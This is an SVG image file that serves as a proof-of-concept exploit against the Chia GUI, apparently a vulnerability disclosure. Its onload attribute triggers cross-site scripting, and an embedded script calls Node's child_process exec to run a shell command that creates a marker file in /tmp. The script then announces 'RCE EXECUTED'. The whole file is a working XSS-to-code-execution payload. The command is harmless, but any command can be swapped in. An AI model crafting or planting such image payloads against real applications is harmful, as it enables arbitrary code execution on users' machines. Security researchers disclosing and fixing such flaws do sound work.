<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS in Chia GUI!')">
  <script><![CDATA[
    try {
      const { exec } = require('child_process');
      exec('touch /tmp/chia_pwned_for_real', function(error, stdout, stderr) {
        if (error) {
          console.log('Error:', error);
        } else {
          console.log('RCE SUCCESS: File created at /tmp/chia_pwned_for_real');
        }
      });
      alert('RCE EXECUTED - Check /tmp/chia_pwned_for_real');
    } catch (e) {
      alert('XSS Confirmed but RCE failed: ' + e.message);
    }
  ]]></script>
  <rect width="100" height="100" fill="red"/>
  <text x="10" y="50" fill="white">PWNED</text>
</svg>
